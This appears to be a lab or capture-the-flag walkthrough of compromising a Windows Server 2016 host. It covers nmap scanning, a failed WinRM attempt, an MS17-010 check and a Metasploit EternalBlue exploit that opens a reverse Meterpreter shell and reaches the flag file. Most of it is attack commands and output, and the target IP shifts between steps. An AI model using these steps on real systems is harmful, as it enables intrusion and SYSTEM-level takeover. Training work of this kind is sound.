## Infiltrating Windows

1. scan the target with nse and version scanning with nmap.

```
nmap $target_ip -sCV -T5
```

output:
```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-title: 10.129.201.97 - /
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-10-29T15:55:30-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-10-29T22:55:27
|_  start_date: 2026-10-29T22:54:12
|_clock-skew: mean: 2h19m31s, deviation: 4h02m31s, median: -30s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.96 seconds
```

similar to the last section...

port `445` is open with signing enabled but not required.

port `5985` is a potential remote powershell access.

2. open msfconsole.

```
msfconsole
```

output:
```
       =[ metasploit v6.5.7-dev                                 ]
+ -- --=[ 2,711 exploits - 1,366 auxiliary - 2,616 payloads     ]
+ -- --=[ 437 post - 57 encoders - 14 nops - 13 evasion         ]
msf > 
```

3. use `exploit(windows/winrm/winrm_script_exec)`.

```
msf > use 7
msf exploit(windows/winrm/winrm_script_exec) >
```

4. set required settings.

```
msf exploit(windows/winrm/winrm_script_exec) > set RHOSTS 10.129.201.97
RHOSTS => 10.129.201.97
msf exploit(windows/winrm/winrm_script_exec) > set LHOST 10.10.14.83
LHOST => 10.10.14.83
msf exploit(windows/winrm/winrm_script_exec) > set DOMAIN WORKGROUP
DOMAIN => WORKGROUP
```

5. run the exploit.

```
msf exploit(windows/winrm/winrm_script_exec) > run
```

output:
```
[*] Started reverse TCP handler on 10.10.14.83:4444 
[-] Exploit aborted due to failure: bad-config: The PASSWORD option is required unless using Kerberos authentication.
[*] Exploit completed, but no session was created.
```

we need valid credentials for the target which we don't have yet.

6. the hostname of the target machine in the nmap scan was `WINBLUE`, which might hint at EternalBlue, a well-known smb vulnerability associated with `MS17-010`. question 2 also hinted towards this exploit. let's run a test by scanning for that vulnerability with an auxiliary module.

```
msf > use auxiliary/scanner/smb/smb_ms17_010
msf auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97
RHOSTS => 10.129.201.97
msf auxiliary(scanner/smb/smb_ms17_010) > run
[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.37/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

potentially exploitable `MS17-010` vulnerability.

7. use an eternalblue rce exploit.

```
msf > use exploit/windows/smb/ms17_010_psexec
```

8. set required settings.

```
msf exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.237.7
RHOSTS => 10.129.237.7
msf exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.83
LHOST => 10.10.14.83
```

9. run the exploit.

```
msf exploit(windows/smb/ms17_010_psexec) > run
```

output:
```
[*] Started reverse TCP handler on 10.10.14.83:4444 
[*] 10.129.237.7:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.237.7:445 - Built a write-what-where primitive...
[+] 10.129.237.7:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.237.7:445 - Selecting PowerShell target
[*] 10.129.237.7:445 - Executing the payload...
[+] 10.129.237.7:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (203451 bytes) to 10.129.237.7
[*] Meterpreter session 1 opened (10.10.14.83:4444 -> 10.129.237.7:49671) at 2026-10-29 19:41:07 -0400

meterpreter >
```

session opened.

10. open windows cli.

```
meterpreter > shell
```

11. verify flag location.

```
C:\Windows\system32>dir C:\
```

output:
```
dir C:\
 Volume in drive C has no label.
 Volume Serial Number is 9850-1131

 Directory of C:\

10/18/2021  01:52 PM                14 flag.txt
10/18/2021  01:51 PM    <DIR>          inetpub
07/16/2016  06:23 AM    <DIR>          PerfLogs
10/05/2020  06:51 PM    <DIR>          Program Files
10/05/2020  06:51 PM    <DIR>          Program Files (x86)
10/05/2020  06:51 PM    <DIR>          Users
10/19/2021  02:43 PM    <DIR>          Windows
               1 File(s)             14 bytes
               6 Dir(s)  30,576,812,032 bytes free
```

12. read flag.

```
C:\Windows\system32>type C:\flag.txt
```